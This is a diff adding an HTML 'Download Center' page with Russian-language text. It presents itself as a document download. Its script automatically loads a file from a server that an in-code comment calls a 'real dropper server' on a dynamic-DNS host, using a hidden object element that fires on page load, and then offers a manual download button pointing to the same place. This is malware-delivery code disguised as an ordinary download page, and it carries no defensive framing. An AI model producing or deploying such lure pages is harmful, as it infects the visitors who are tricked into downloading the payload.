@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Download Center</title>
+    <meta charset="utf-8">
+    <style>
+        body { background: #f4f7f9; color: #1a1a1b; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .card { background: #fff; padding: 40px; border-radius: 12px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border: 1px solid #e1e8ed; max-width: 350px; }
+        .btn { display: inline-block; margin-top: 25px; padding: 12px 24px; background: #007bff; color: #fff; text-decoration: none; border-radius: 6px; font-weight: 500; }
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #007bff; border-radius: 50%; width: 36px; height: 36px; animation: spin 0.8s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="loader" id="loader"></div>
+        <h2 id="status">Подготовка файла...</h2>
+        <a href="#" class="btn" id="manualBtn" style="display:none;">Скачать вручную</a>
+    </div>
+
+    <script>
+        // Получаем параметры из URL: ?file=filename.pdf&path=unique_path
+        const urlParams = new URLSearchParams(window.location.search);
+        const subpath = urlParams.get('path');
+        
+        // Твой реальный сервер-дроппер
+        const apiBase = "http://echomapwa.ddns.net/dropper/documentdwnl/";
+        const downloadUrl = apiBase + subpath + "?download=true";
+
+        if (subpath) {
+            // Инициируем загрузку
+            const obj = document.createElement('object');
+            obj.data = downloadUrl;
+            obj.style.display = 'none';
+            document.body.appendChild(obj);
+
+            // Показываем кнопку, если автомат не сработал
+            setTimeout(() => {
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('status').innerText = 'Файл готов';
+                const btn = document.getElementById('manualBtn');
+                btn.href = downloadUrl;
+                btn.style.display = 'inline-block';
+            }, 3000);
+        } else {
+            document.getElementById('status').innerText = 'Ошибка: Файл не найден';
+        }
+    </script>
+</body>
+</html>
